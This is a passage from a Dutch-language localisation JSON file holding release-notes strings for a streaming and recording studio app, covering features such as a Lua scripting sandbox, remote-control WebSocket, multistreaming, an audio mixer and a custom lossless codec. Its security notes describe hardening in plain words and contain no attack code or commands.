uitbreidbaarheid (fase 7)","changelog.cc7d3cbcb365":"<strong>WebSocket-API voor bediening op afstand</strong> (TASK-701) — een met wachtwoord beveiligde WebSocket waarmee een controller in de stijl van Stream Deck / Companion verbinding maakt: scènes wisselen, de overgang uitvoeren, stream en opname starten/stoppen, replays opslaan, dempen en volumes instellen — dezelfde acties als de UI, niets meer (hij kan geen bestanden lezen). <strong>Standaard uit</strong>; bindt aan <code>127.0.0.1</code>, tenzij LAN uitdrukkelijk is ingeschakeld; uitgeschakeld betekent dat de poort dicht is. Authenticatie werkt met challenge-response — het wachtwoord gaat nooit over de lijn. Instellingen → Bediening → <strong>⌁ Remote…</strong>.","changelog.155aa02952b7":"<strong>Browserdocks</strong> (TASK-702) — open een losse chat, een pagina met meldingen of de webknoppen van Companion als eigen venster naast de studio (alleen http/https; het dock heeft geen toegang tot de app, het geeft alleen weer). Bediening → <strong>⧉ Docks…</strong>.","changelog.3149da08891b":"<strong>Lua-scripts in een sandbox</strong> (TASK-703) — <code>.lua</code>-scripts die op studiogebeurtenissen reageren (live gaan, scènewissel, opnamestatus) en dezelfde opdrachten aansturen als de API voor bediening op afstand. De sandbox heeft <strong>geen toegang tot bestanden of het besturingssysteem</strong> (geen <code>io</code>/<code>os</code>/<code>require</code>, en de bytecode-laders zijn dicht); een scriptfout blijft ingesloten. <code>scripts/sample.lua</code> laat de API zien. Bediening → <strong>⚡ Scripts…</strong>.","changelog.507908bbd502":"<strong>Plug-in-SDK</strong> (TASK-704) — gedocumenteerde contracten voor <code>Source</code>/<code>Filter</code> + een koppelvlak voor een register, zodat een plug-in-crate een bron of filter kan toevoegen <strong>zonder de kern aan te raken</strong>. <code>plugins/checkerboard</code> is het complete voorbeeld; <code>design/plugin-sdk.md</code> is de handleiding.","changelog.5c03c1a47d1d":"<strong>Webpagina om mee te doen voor gasten met een telefoon</strong> (TASK-R3) — de QR-code van de uitnodiging opent nu <code>docs/join.html</code> op de Pages-site: de gastkant van een sessie met gasten op afstand, in een gewone browser (camera + microfoon, meedoen alleen na een uitdrukkelijke klik, zelf dempen onder het model met twee poorten, terugspraak en beeld van de gastheer, scherm delen waar de browser dat ondersteunt, automatisch opnieuw meedoen met oplopende wachttijd) — niets te installeren, geen CDN (PeerJS meegeleverd). De kopieerbare <code>freally://</code>-link opent de app nog steeds rechtstreeks.","changelog.41ecc350d86a":"<strong>Eigen voorbeeld (Windows)</strong> — de eerste opbouw van het oppervlak door de renderthread wordt nu onder het overlayslot achter de DirectComposition-commits van de UI-thread geplaatst (een kleine race met een leeg voorbeeld als een formaatwijziging precies samenviel met het ontstaan van het oppervlak), en het eigen selectiekader hergebruikt nu de berekening van de bijsnijketen van de compositor zelf in plaats van een zelfgeschreven kopie (TASK-NP7).","changelog.e2d476fc460a":"<strong>Vensteropname</strong> — de cursorpomp maakt niet meer ~60 fps aan frames zonder getekende inhoud terwijl de cursor ergens beweegt waar <em>niet</em> het opgenomen venster is (een ander venster dat het bedekt, of ergens anders op het bureaublad). Gevonden door het nieuwe live testharnas met één proces per test (<code>scripts/live-capture-tests.ps1</code>, TASK-NP9), dat ook de race bij het afbreken van WinRT/D3D omzeilt die live runs met meerdere tests kon laten crashen.","changelog.d574645cb05e":"<strong>Handvestdocumenten</strong> — README / PRIVACY / SECURITY beschrijven nu eerlijk het opt-in-P2P-netwerkoppervlak voor gasten op afstand (uitnodigingen die verlopen, meedoen alleen na een uitdrukkelijke klik, P2P-media via DTLS-SRTP, de broker draagt alleen de handshake, optionele TURN van de gebruiker zelf, de werking van moderatie en bans), en <code>THIRD-PARTY-NOTICES.md</code> kreeg de ontbrekende vermeldingen voor PeerJS en qrcode-generator.","changelog.c173f50767b2":"<strong>Lua-sandbox verstevigd</strong> — de scriptsandbox sluit nu ook <code>load</code>/<code>loadstring</code> uit de basisbibliotheek en <code>string.dump</code>, niet alleen <code>dofile</code>/<code>loadfile</code>. <code>load</code> van Lua 5.4 accepteert standaard <strong>binaire bytecode</strong>, waarvan de lader niet wordt gecontroleerd — een gemanipuleerd stuk bytecode is een ontsnapping uit de VM naar native code die de sandbox zonder io/os volledig zou omzeilen. Gevonden door de beveiligingsreview van deze fase vóór de release; een regressietest controleert dat alle drie weg zijn.","changelog.1ebe7221d5d2":"[0.85.0] — 2026-07-07 (Streamen in de diepte: multistream / SRT / WHIP + scènes, bronnen en encoders in de diepte)","changelog.2d315220f41f":"<strong>Het magische moment</strong> — ga tegelijk live op Twitch <strong>en</strong> YouTube terwijl je een aparte lokale kopie opneemt en een replay van 30 seconden opslaat, met een verticale 9:16-uitvoer, geneste scènes en een live chat-overlay die <strong>nooit een API-sleutel of inloggen</strong> nodig heeft.","changelog.feb4e52158c8":"Toegevoegd — streamen in de diepte","changelog.75834546387e":"<strong>Gelijktijdige multistream</strong> (TASK-601) — ga live naar meerdere bestemmingen tegelijk, <strong>rechtstreeks naar elk platform</strong> (geen restreamserver). Bestemmingen met dezelfde coderingsinstellingen <strong>delen één hardwarecodering</strong> (uitgewaaierd via <code>tee</code> van ffmpeg); verschillende instellingen worden apart gecodeerd. Een mislukte bestemming wordt afgesplitst naar een eigen baan die opnieuw verbindt, zodat hij een gezonde bestemming nooit kan meeslepen; het statistiekendock toont per bestemming de status en bitrate, los van elkaar.","changelog.d7881741d3bc":"<strong>SRT en WHIP</strong> (TASK-602) — stream naar een zelf gehoste SRT-ontvanger of een WebRTC-WHIP-eindpunt naast RTMP/RTMPS, met herverbinden + statusbewaking. Of de geïnstalleerde ffmpeg SRT/WHIP ondersteunt, wordt bij Ga live eerlijk gecontroleerd. WHIP-streamsleutels gaan mee in de <code>Authorization</code>-header, nooit in de URL.","changelog.01e2ed129c31":"<strong>Doorlopende replaybuffer</strong> (TASK-603) — zolang hij geactiveerd is, houdt een codering op de achtergrond de laatste N seconden bij als kleine segmenten op schijf (begrensd geheugen + schijfruimte); een globale sneltoets slaat ze op in een afspeelbaar bestand <strong>zonder de stream of de opname te onderbreken</strong>, met voorinstellingen voor lengte en kwaliteit.","changelog.8abd1a3e56cd":"<strong>Verticaal / meerdere canvassen</strong> (TASK-604) — een tweede canvas (bijv. 9:16), samengesteld uit elke scène op een eigen formaat, <strong>los van het hoofdcanvas op te nemen en te streamen</strong>; met een live voorbeeld en een eigen fps-statistiek.","changelog.2c69be261f19":"Toegevoegd — scènes, bronnen, filters en encoders in de diepte","changelog.be269b309b79":"<strong>Geneste scènes, brongroepen en audio per scène</strong> (TASK-605) — een scène die als bron in een andere scène wordt gecomponeerd (veilig tegen kringverwijzingen); groepen die samen bewegen, verschijnen en verdwijnen; een mixeroverschrijving per scène, zodat een scène anders kan klinken dan de globale mix.","changelog.5c7ab998f7ed":"<strong>Overgangspakketten</strong> (TASK-606) — een <strong>stinger</strong> (een video over de snede), een <strong>eigen afbeelding voor luma-wipe</strong> en meer ingebouwde wipe-patronen (horizontaal / ruit / klok).","changelog.4d324b472fe3":"<strong>Bron Diavoorstelling + voorinstellingen voor capture-kaarten</strong> (TASK-607) — een geordende set afbeeldingen die op een timer wisselt, met optionele overvloeier, herhalen/laatste vasthouden en willekeurige volgorde; gangbare formaatvoorinstellingen voor Elgato/AVerMedia in de kiezer voor videoapparaten (alleen modi die de kaart echt aanbiedt).","changelog.67f18114a372":"<strong>Color-key / luma-key + filters voor rendervertraging</strong> (TASK-608) — key elke kleur weg op basis van RGB-afstand (achtergronden die niet groen zijn), key op helderheid, en vertraag de video van een bron met N ms om die gelijk te laten lopen met het geluid.","changelog.8349cff49176":"<strong>Encoders in de diepte</strong> (TASK-609) — <strong>Rec.709</strong>-kleur vastgezet bij elke codering in een standaardformaat (geen verwassen of verschoven HD-kleuren meer), een optionele <strong>verkleining van de uitvoer</strong> (opnemen/streamen op een andere resolutie dan het canvas — per streambestemming), en paden voor hoge fps (120/144/240) + 4K. HDR is eerlijk gedocumenteerd als buiten de reikwijdte (het canvas is 8-bit SDR).","changelog.e821097e85ca":"<strong>Hoofdstukmarkeringen in opnames</strong> (TASK-610) — een sneltoets voor markeringen zet een hoofdstuk in de lopende opname (mkv-hoofdstukken, of een leesbaar bijbestand bij andere containers). Streammarkeringen aan de kant van het platform hebben account-API's nodig — uitgesloten door het handvest, en dat staat eerlijk in het product.","changelog.9ee401a2a83a":"<strong>Live chat-overlay</strong> (TASK-613) — een transparant verslag met tijdstempels op het canvas van de binnenkomende chat van de livestream (gebruikersnaam + bericht + een tijdstempel in 12-uursnotatie). <strong>De eindgebruiker heeft nooit een API-sleutel, ontwikkelaarsaccount of inlog voor YouTube of Twitch nodig:</strong> YouTube leest via een eigen InnerTube-client, precies zoals de webspeler, Twitch leest anoniem via IRC, Kick vraagt zijn openbare eindpunt op. Een stortvloed aan chat laat alleen oude regels verdwijnen — hij kan de stream, de opname of de overlay nooit laten haperen.","changelog.fcfab0e66cef":"<strong>Overlay met zwevende reacties</strong> (TASK-614) — emoji-reacties van kijkers stijgen op en vervagen, <strong>ingebakken in het programma</strong> (opgenomen en gestreamd), vanuit de reactiebalk in de app of opgemerkt in dezelfde chatontvangst zonder sleutel; een begrensde pool van deeltjes zorgt dat een stortvloed aan reacties alleen begrenst wat er in beeld is.","changelog.b7f3aacf8907":"Uitgesteld (eerlijk gezegd)","changelog.d7babe268df3":"<strong>Virtuele camera in de diepte</strong> (TASK-611) — een echte virtuele camera is een ondertekend driveronderdeel van het besturingssysteem (een eigen mijlpaal). Het model voor de beeldbron (programma / verticaal / enkele bron) en het transportkoppelvlak per besturingssysteem komen nu mee; de knop blijft uitgeschakeld, met het hele verhaal in de tooltip.","changelog.d1bbc34e384f":"<strong>Browserbron</strong> (TASK-612) — een ontwerpverkenning (<code>design/browser-source-spike.md</code>) raadt een inbedding in de klasse van CEF aan, geleverd als onderdeel op aanvraag (zoals ffmpeg); de beslissing ligt bij Mike.","changelog.39e93c6d3eb9":"[0.70.0] — 2026-07-06 (Streamen + studio-MVP — eerste openbare versie)","changelog.2b4289185858":"De studio waarmee je live kunt gaan: streamen naar één bestemming via RTMP/RTMPS, Studiomodus + GPU-overgangen, globale sneltoetsen, profielen + scèneverzamelingen, een echt statistiekendock — en de volledige P2P-samenwerking <strong>Gasten op afstand</strong>, samengevoegd vanuit fase R.","changelog.1ab82763e794":"<strong>Streamen naar één bestemming</strong> (RTMP/RTMPS naar Twitch/YouTube/Kick/Facebook/Trovo/Aangepast) met een geheime, gemaskeerde streamsleutel, herverbinden met oplopende wachttijd en automatisch opnemen bij Ga live; de lokale opname wordt nooit door de streamstatus beïnvloed.","changelog.5d254b2963c1":"<strong>Studiomodus + GPU-overgangen</strong> — een live voorbeeldvenster en een overgang bij het doorzetten (knip/vervagen/schuiven/ veeg/luma) die het publiek ziet.","changelog.a95243dac70b":"<strong>Globale sneltoetsen</strong> (opnemen / Ga live / overgang) en een <strong>echt statistiekendock</strong> (fps / verloren / render-ms + CPU% / geheugen van dit proces).","changelog.1bff268c26f0":"<strong>Profielen + scèneverzamelingen</strong> — instellingen en momentopnamen van scènes om tussen te wisselen, onthouden na herstarten.","changelog.3e3cc955eb95":"<strong>Gasten op afstand (fase R)</strong> — opt-in samenwerking op afstand via P2P/WebRTC: uitnodigingslinks die verlopen, de microfoon van de gast in de mixer, dempen met twee poorten, Spreker uitlichten, de indeling scherm-plus-hoeken en een eigen opt-in TURN-relay van de gebruiker (geen infrastructuur die de maker draait).","changelog.2fd6b77c5ce7":"[0.56.0] — 2026-07-06 (Eigen GPU-voorbeeld + verbeteringen aan Vensteropname)","changelog.6536f40e75b5":"Het voorbeeld <em>voelt</em> nu als OBS op <strong>Windows, macOS en Linux</strong>: de GPU-uitvoer van de compositor wordt rechtstreeks op het scherm getekend zonder omweg via uitlezen en coderen — en Vensteropname kiest met live miniaturen, overleeft een herstart en herstelt zichzelf.","changelog.c5202dd3e1c5":"Toegevoegd — eigen GPU-voorbeeld („het OBS-gevoel”) op Windows, macOS en Linux","changelog.b77d015fe905":"<strong>Een eigen GPU-voorbeeldoppervlak zonder kopiëren</strong>, dat het voorbeeld via uitlezen → JPEG → canvas vervangt door de eigen GPU-uitvoer van de compositor, rechtstreeks op het scherm getekend — geen omweg via coderen, geen vertraging. Per besturingssysteem: <strong>Windows</strong> een <strong>DirectComposition</strong>-oppervlak (wgpu <code>SurfaceTargetUnsafe::CompositionVisual</code> op DX12) dat <em>boven</em> WebView2 wordt gecomponeerd, <strong>in realtime gecontroleerd op hardware</strong>; <strong>macOS</strong> een <strong>CAMetalLayer</strong> over de WKWebView (Metal); <strong>Linux</strong> een X11-kindvenster dat een <strong>Vulkan/GL</strong>-oppervlak aanstuurt (Wayland houdt voorlopig het JPEG-voorbeeld). Van alle drie is <strong>in CI bewezen dat ze weergeven</strong> — de screenshot-smoketest controleert bij elke push de echte pixels. Het interactieve <strong>selectiekader + de transformatiegrepen worden in het GPU-frame zelf getekend</strong> (alleen in het voorbeeld — nooit opgenomen of gestreamd). Onder de motorkap is de GPU-stack <strong>geüpgraded van wgpu 0.20 naar 27</strong>. Het JPEG-voorbeeld blijft de universele terugvaloptie en keert automatisch terug zodra het eigen oppervlak niet haalbaar is (een Windows-GPU zonder DX12, Wayland, een verloren oppervlak).","changelog.0f1a68ade361":"Toegevoegd — een vensterkiezer met live miniaturen die elk venster toont","changelog.dc9f6df8df56":"<strong>De kiezer van Vensteropname toont nu een live miniatuur van elk open venster</strong> — een raster van tegels met echte opgenomen frames, ververst zolang de kiezer open is (verspreid in de tijd, zodat het openen de backend niet overspoelt), met een knop om handmatig te verversen. Miniaturen reizen als <strong>JPEG-<code>data:</code>-URI's in het geheugen via IPC — er wordt nooit iets naar schijf geschreven</strong>, dus ze verdwijnen zodra de kiezer sluit.","changelog.3519efd99c8a":"<strong>Geminimaliseerde vensters staan er ook bij</strong> (voorheen werden ze weggefilterd): Windows valt terug op de herstelde grootte van het venster als het geminimaliseerd is, macOS somt vensters buiten beeld op, en Linux/X11 toonde ze al. Een aparte <strong>CI-taak voor het opsommen van vensters</strong> opent twee vensters, minimaliseert er één en controleert dat ze allebei verschijnen.","changelog.87f9b12b0ac3":"<strong>De gele opnamerand van Windows is weg</strong> — sessies van Windows.Graphics.Capture vragen nu om geen rand (naar beste kunnen; oudere Windows-builds die dat niet ondersteunen, houden het oude gedrag).","changelog.a153cea5d4be":"Toegevoegd — Vensteropname die na een herstart opnieuw koppelt + automatisch herstel","changelog.3e74cf2927b9":"**Een Vensteropname koppelt zich opnieuw aan <em>hetzelfde</em> venster als je de app opnieuw start<strong> — zoals OBS Studio dat doet. Een vensterhandle van het besturingssysteem (Windows <code>HWND</code>, macOS <code>CGWindowID</code>, X11 XID) is maar één sessie geldig, dus een opgeslagen vensterbron bewaart nu ook de </strong>blijvende identiteit<strong> van het venster — het uitvoerbare bestand of de eigenaar-app, de vensterklasse en de titel — en zoekt bij het starten </strong>het actieve venster opnieuw op door die identiteit te vergelijken**, verankerd aan de app, zodat hij nooit aan een ongerelateerd programma koppelt (klasse + titel beslissen tussen meerdere vensters van dezelfde app). Id's met alleen een handle uit oudere opgeslagen scènes laden nog steeds. <em>Windows is gecontroleerd op hardware; macOS (ScreenCaptureKit) en Linux/X11 delen dezelfde vergelijker en worden in CI gevalideerd; Wayland verandert niet — de systeemportal kiest de bron opnieuw en is al blijvend.</em>","changelog.55f49748f04d":"<strong>Mislukte opnames herstellen zichzelf.</strong> Een bron voor Beeldscherm-, Venster- of Video-opname die mislukte omdat het venster, de monitor of de camera er nog niet was, wordt <strong>automatisch opnieuw geprobeerd</strong> (oplopende wachttijd per bron, 3 s, verdubbeld tot 60 s), dus hij gaat live zodra het venster weer opengaat of het apparaat opnieuw verbinding maakt — zonder handmatig Opnieuw proberen (de knop Opnieuw proberen blijft voor een duwtje op verzoek). Portals voor schermkeuze en mediabronnen blijven ongemoeid.","changelog.e0a0ac02515e":"<strong>Een opgenomen venster dat midden in een sessie sluit, wordt betrouwbaar opgemerkt.</strong> De gebeurtenis van Windows dat de opname is gesloten, gaat bij sommige apps met verhoogde rechten of apps die zich in het systeemvak verbergen nooit af, waardoor de bron „live” zou blijven hangen op het laatste frame; de opname bewaakt nu ook de vensterhandle zelf en geeft een fout zodra het venster echt weg is — en precies dat activeert het automatische herstel hierboven.","changelog.67f786726842":"<strong>De muiscursor beweegt nu mee in Vensteropname — met of zonder focus.</strong> Windows componeert de cursor alleen in opnames van het venster <em>met focus</em> (een venster zonder focus krijgt geen cursor, en zelfs helemaal geen frames zolang de inhoud stilstaat), dus een opgenomen app waarop je niet klikte, leek bevroren. Freally Capture <strong>tekent de cursor nu zelf</strong>, zoals OBS dat doet — echte cursorvormen (alfa, klassiek masker en inverterende cursors), live gevolgd en in het frame gecomponeerd, met aangemaakte frames als alleen de cursor bewoog. Gemeten op hardware: een venster zonder focus ging van ~0 updates naar <strong>55 fps bij snelle beweging / 32 fps bij rustig aanwijzen</strong>. <strong>Beeldschermopname</strong> kreeg dezelfde behandeling: de cursor blijft in een opname bewegen, ook als de rest van het bureaublad stilstaat.","changelog.768c67ad0574":"[0.55.0] — 2026-07-03 (Audiomixer + opnemen)","changelog.82a067a13f56":"De trede 0.55.0 is <strong>fase 3 (audiomixer + filters)</strong> plus <strong>fase 4 (opnemen)</strong> — de studio kan nu zijn programmabeeld mixen en <strong>opnemen</strong> op schijf, met meerdere sporen, met de beste beschikbare hardware-encoder of de eigen verliesvrije codec.","changelog.6550f4141d88":"Toegevoegd — opnemen (fase 4)","changelog.8f276d78647e":"<strong>De eigen verliesvrije codec <code>freally-video</code> (<code>.frec</code>)</strong> (<code>fcap-encode</code>): het standaardformaat voor lokale opnames, hier geschreven en <strong>volledig in eigen bezit</strong> — temporele framedelta's + voorspelling van de linkerpixel in PNG-stijl + een eigen byte-uitgelijnde <strong>FLZ</strong>-stap (LZ77), elke techniek al tientallen jaren vrij of publiek domein, <strong>nul afhankelijkheden, niets opgehaald</strong>, <code>#![forbid(unsafe_code)]</code>. De container bevat tot <strong>6 verweven stereo-PCM-sporen</strong> met absolute samplepositie (A/V-synchronisatie + naadloos pauzeren door de opbouw zelf), intraframes ongeveer elke ~2 s, een zoekindex en een <strong>lezer die tegen afgekapte bestanden kan</strong> (een gecrashte opname speelt af tot het laatste complete blok; corrupte invoer geeft een fout, nooit een panic, en de geheugenreservering is begrensd tegen vijandige bestanden). In realtime gecontroleerd: een synthetische 1080p60-codering blijft binnen het budget.","changelog.8d5c44a0b1af":"<strong>Encoderdetectie + de encodercatalogus</strong>: een <code>wgpu</code>-GPU-controle (vendor-id's + vuistregels op naam, softwarerasterizers overgeslagen) stuurt de aanbodregels per besturingssysteem — <strong>NVENC / Quick Sync / AMF</strong> op Windows, <strong>NVENC / VAAPI</strong> (afhankelijk van een render-node) op Linux, <strong>VideoToolbox</strong> op macOS — altijd naast de universele CPU-terugvalopties <strong>x264 / x265 / AV1</strong>. Hardware-encoders worden als eerlijke kandidaten aangeboden en bij het eerste gebruik <strong>bevestigd door een echte smoketest-codering van 3 frames</strong> (ondersteuning verschilt per GPU + driver); elke encoder voor standaardformaten vermeldt zijn afhankelijkheid van ffmpeg.","changelog.14fd14e34068":"<strong>Muxen met meerdere sporen, containers en bestandssplitsing</strong>: neem op naar <strong>mp4 / mkv / mov / webm</strong> (standaardcodecs) of het eigen <strong><code>.frec</code></strong> (verliesvrij), met <strong>tot 6 audiosporen</strong>, en <strong>automatische bestandssplitsing</strong> in losse afspeelbare segmenten. De opname-engine draait op een strikte CFR-klok (aantal frames vastgezet op de opgenomen tijd), dus A/V blijft synchroon bij haperingen en <strong>pauzeren/hervatten is naadloos binnen één afspeelbaar bestand</strong>. De hoofdopname is zo opgezet dat hij doorloopt, ongeacht de streamstatus (streamen komt in 0.70.0), en er wordt een <strong>lokale kopie met aparte sporen</strong> voor bewaard.","changelog.a153199fe59d":"<strong>De duidelijk gelabelde ffmpeg-brug op aanvraag</strong> (<code>fcap-encode::ffmpeg</code>): de standaardcodecs waar patenten op rusten (H.264/AAC/HEVC/AV1) lopen via ffmpeg, dat <strong>nooit wordt meegeleverd</strong>. Bij het eerste gebruik wordt het opgehaald van een <strong>vastgepinde build per besturingssysteem</strong> (URL + <strong>SHA-256 ingebakken in de broncode</strong>, gecontroleerd tegen de eigen checksum van de uitgever), <strong>met de hash gecontroleerd voordat er iets draait</strong> (bij een afwijking wordt de installatie afgebroken), uitgepakt (één enkel bestand — paden uit het archief worden nooit gebruikt om te schrijven) en aangestuurd als <strong>apart proces</strong> (wat ook de LGPL/GPL-licentie gescheiden houdt van de eigen app). Een duidelijk gelabeld paneel <strong>Componenten</strong> laat zien wat het is, waarom het er is, de vastgepinde bron en de live voortgang in %/van totaal/MB/s; het eigen <code>.frec</code>-pad heeft dit allemaal niet nodig.","changelog.823a023c395e":"<strong>HEVC-/AV1-opname + hermuxen na de opname</strong>: HEVC en AV1 nemen op via het gelabelde ffmpeg-pad (met hardware waar de GPU dat ondersteunt); een lijst <strong>Opnamen</strong> (Bediening → Bestanden…) toont afgeronde bestanden, nieuwste eerst, en biedt <strong>Hermuxen naar MP4</strong> (mkv → mp4, <code>-c copy</code>, geen nieuwe codering, faststart, <code>hvc1</code>-tag bij HEVC). De hermuxopdracht controleert dat het pad in de opnamemap ligt — de webview kan hem nooit op willekeurige bestanden richten.","changelog.8f8423224424":"<strong>Encoderinstellingen + voorinstellingen</strong> (Instellingen → Uitvoer): bitratesturing <strong>CBR / VBR / CQP</strong> + bitrate + keyframe-interval, voorinstellingen per encoder <strong>Kwaliteit / Gebalanceerd / Prestaties</strong> (vertaald naar de eigen knop van elke familie), audiobitrate per spoor, en opnamevoorinstellingen in één klik <strong>Verliesloos / Hoge kwaliteit / Gebalanceerd</strong>. Opnamebediening in het dock: <strong>Start / Stoppen / Pauzeren / Hervatten</strong>, een pulserende <strong>REC</strong>-indicator met duur (pauzes niet meegeteld) + aantal sporen, en de bestanden van de laatste sessie of de eerlijke foutmelding ervan.","changelog.a6dabb1cab06":"<strong>De mediabron</strong> (<code>fcap-sources::media</code>) — overgenomen uit fase 2: een video- of afbeeldingsbestand dat op het canvas wordt gecomponeerd, <strong>met het geluid in de mixer</strong>. Stilstaande afbeeldingen worden één keer gedecodeerd (zoals bij de afbeeldingsbron); <strong><code>.frec</code> speelt af via de eigen codec</strong>, zonder iets op te halen; de standaardformaten worden gedecodeerd via het gelabelde ffmpeg-onderdeel (<code>-hwaccel auto</code> voor hardwaredecodering, terugval op software, herhalen/opnieuw starten), en een stop-watchdog zorgt dat een vastgelopen decoder de studio nooit kan laten vastlopen. Mediageluid loopt via een nieuwe <strong>media-audiohub</strong>, zodat een mediaclip een volledig mixerkanaal krijgt (fader, filters, sporen, synchronisatieverschuiving) zonder speciale gevallen.","changelog.78a7ab9818b8":"Toegevoegd — audiomixer (fase 3)","changelog.bb86ddd81916":"<strong>De eigen audio-engine</strong> (<code>fcap-audio</code>): een <code>cpal</code>-opnamegraaf die intern alles als <strong>stereo f32 op 48 kHz</strong> verwerkt, in blokken van 10 ms. Opname per bron van <strong>microfoon / lijningang</strong> (Audio-ingang) en <strong>bureaublad- / systeemgeluid</strong> (Audio-uitgang), elk omgezet en geresampled naar de klok van de engine via een <strong>eigen lineaire streaming-resampler</strong>. Over bureaubladgeluid wordt per besturingssysteem eerlijk verteld: <strong>Windows</strong> neemt elk uitvoerapparaat op via <strong>WASAPI-loopback</strong>; <strong>Linux</strong> gebruikt een <strong>monitor</strong>-apparaat van PipeWire/PulseAudio; <strong>macOS</strong> heeft een virtueel loopback-apparaat nodig (bijv. BlackHole) totdat er een audiopad via ScreenCaptureKit komt — de kiezers zeggen dat en filteren op bekende virtuele apparaten.","changelog.4541b9b25062":"<strong>De mixgraaf</strong>: per bron <strong>vertraging voor synchronisatie → filterketen → push-to-talk / push-to-mute / dempen / fader</strong>, gerouteerd naar <strong>tot 6 spoorbussen</strong> (toewijzing per bron), de <strong>programmamix (master)</strong> en een <strong>monitormix</strong>. Klikvrije versterkingsafvlakking van ~8 ms bij elke beweging van dempen/PTT/fader. De hele kern is puur en <strong>apparaatvrij — elke routeringsregel wordt zonder hardware unit-getest</strong>.","changelog.805988055894":"<strong>De eigen set klassieke DSP-filters — nergens ML, volgens het handvest</strong>: <strong>Ruisonderdrukking</strong> (spectrale onderdrukking via STFT met een eigen radix-2-FFT — √Hann-frames van 512 samples, 50% overlap, het volgen van de ruisvloer per bin + spectrale aftrekking; constante ruis valt weg terwijl spraak erdoor komt), <strong>Noise Gate</strong> (hysterese + vasthouden), <strong>Compressor</strong> (piekdetectie, make-up gain), <strong>Limiter</strong> (directe attack met een hard plafond), <strong>3-Bands EQ</strong> (RBJ-shelf/peak-biquads), <strong>Versterking</strong>, en sidechain-<strong>Ducking</strong> (de ene bron onder een andere laten zakken). Elke processor is defensief begrensd, zodat een met de hand bewerkte scène niet kan ontsporen.","changelog.d379afe46aba":"<strong>Monitoring, ducking, PTT/PTM en LUFS</strong>: een <strong>monitoruitgang</strong> op elk apparaat (begrensd, bestand tegen underruns); sidechain-ducking aangestuurd door de live omhullende van de triggerbron; <strong>push-to-talk / push-to-mute</strong> via globale sneltoetsen (geregistreerd vanuit het model, eerlijk over het ontbreken van globale sneltoetsen op Wayland); een <strong>K-gewogen LUFS-meter volgens BS.1770</strong> (momentary + short-term) op de programmamix; piek-/RMS-meting per bron.","changelog.df9eeebe72aa":"<strong>Het paneel Audiomixer</strong>: één <strong>kanaalstrook</strong> per audiobron in de actieve scène — naam + status, een <strong>VU-meter</strong> (groen→geel→rood, piekstreepje), een <strong>fader</strong> (−60…+6 dB), <strong>dempen</strong>, een <strong>monitor</strong>-cyclus, een dialoogvenster <strong>audiofilters</strong> (alle 7 filters, met een triggerkiezer voor ducking), <strong>spoorstippen 1–6</strong> en een geavanceerde popover (synchronisatieverschuiving + sneltoetsen voor PTT/PTM). Een <strong>LUFS</strong>-weergave en een kiezer voor het <strong>monitorapparaat</strong> (bewaard in de instellingen). Audiobronnen verschijnen in de bronnenrail met dezelfde live statusstippen als video, en in het menu <strong>Bron toevoegen</strong> met apparaatkiezers die per besturingssysteem eerlijk zijn.","changelog.97f0a5a2c868":"Het model voor scènes en bronnen (<code>fcap-scene</code>) krijgt de bronsoorten <strong>Audio-ingang / Audio-uitgang</strong> en per bron een <strong><code>AudioSettings</code></strong>-strook (fader, dempen, monitormodus, spoorbitmasker, synchronisatieverschuiving, sneltoetsen voor PTT/PTM, de geordende keten van audiofilters) — getest op serde-round-trips, camelCase in het protocol gecontroleerd, begrensd in bereik en zelfherstellend bij het laden (audiostatus bestaat precies op bronnen die audio kunnen hebben).","changelog.417eeb2ed567":"Beveiliging / privacy","changelog.9fd51762b5f0":"De houding is ongewijzigd en opnieuw gecontroleerd: opgenomen geluid + gecomponeerde frames gaan <strong>alleen</strong> naar de mixer, het monitorapparaat dat de gebruiker kiest, het <strong>opnamebestand</strong> en de virtuele camera — <strong>niets verlaat de machine</strong>, geen accounts, geen telemetrie. De naam van het monitorapparaat die in de instellingen wordt bewaard, wordt op lengte en vorm gevalideerd; sneltoetscombinaties worden geparst en gevalideerd voordat ze het model in gaan.","changelog.ce84fae75efe":"<strong>De enige netwerkactie die deze trede toevoegt, is de uitdrukkelijke download van ffmpeg waarop de gebruiker klikt</strong> — via TLS vanaf een <strong>vastgelegde, per besturingssysteem vastgepinde URL</strong>, <strong>met SHA-256 gecontroleerd voordat het programma ooit wordt uitgevoerd</strong>, en aangestuurd als apart proces. Hij start nooit vanzelf; bij een afwijkende checksum wordt de installatie afgebroken. Het eigen <code>.frec</code>-opnamepad maakt helemaal geen netwerkverbindingen.","changelog.bafa8e1e2feb":"De ffmpeg-audiosporen van de opname-engine lopen via <strong>sockets die alleen op loopback (<code>127.0.0.1</code>) luisteren</strong> en precies één verbinding accepteren en daarna sluiten; opname-instellingen (encoder-id, container, bitrate, map, bestandsnaam) worden <strong>op bereik en vorm gevalideerd</strong> voordat ze worden gebruikt, en <strong>hermux- en opnameacties blijven beperkt tot de opnamemap</strong> (controle van de gecanoniseerde bovenliggende map), zodat de webview geen willekeurige bestanden kan bereiken. De parsers voor <code>.frec</code> en media behandelen bestandsbytes als <strong>niet vertrouwd</strong> — met begrensde geheugenreservering, en bij corrupte invoer een fout in plaats van een panic.","changelog.ab6195393730":"Nieuwe afhankelijkheden van derden, allemaal vastgelegd in <code>THIRD-PARTY-NOTICES.md</code>: <strong><code>tauri-plugin-global-shortcut</code></strong> (push-to-talk/mute), en de set voor ophalen/controleren/uitpakken van de ffmpeg-brug (<strong><code>ureq</code></strong> + rustls, <strong><code>sha2</code></strong>, <strong><code>zip</code></strong>, <strong><code>tar</code></strong> + <strong><code>lzma-rs</code></strong>) plus <strong><code>chrono</code></strong> (bestandsnamen in lokale tijd). De audio-DSP en de codec <strong><code>freally-video</code></strong> zijn <strong>volledig in eigen bezit</strong>; ffmpeg wordt <strong>aangestuurd, nooit meegeleverd</strong>.","changelog.282c879e15bb":"<strong>Smoketests voor audio op echte hardware</strong> (in headless CI op <code>--ignored</code> gehouden) plus een vangrail voor een <code>.frec</code>-codering van 1080p60 in releasemodus; de volledige stroom in de app van ffmpeg downloaden → controleren → opnemen → afspelen is de smoketest voor de release van fase 4.","changelog.78915e8e8933":"[0.40.0] — 2026-07-02 (Compositor + scènes/bronnen)","changelog.64aed5d4e90f":"<strong>De eigen wgpu-GPU-compositor</strong> (<code>fcap-compositor</code>): elk zichtbaar scène-item wordt van achter naar voren in het programmaframe gecomponeerd, met <strong>verplaatsen/schalen/draaien/bijsnijden</strong> per item (één gezaghebbende, unit-geteste transformatie), alle zeven <strong>mengmodi</strong> (normaal/optellen/aftrekken/screen/vermenigvuldigen/ lichter/donkerder als vaste mengstanden), BGRA/RGBA-uploads die rekening houden met 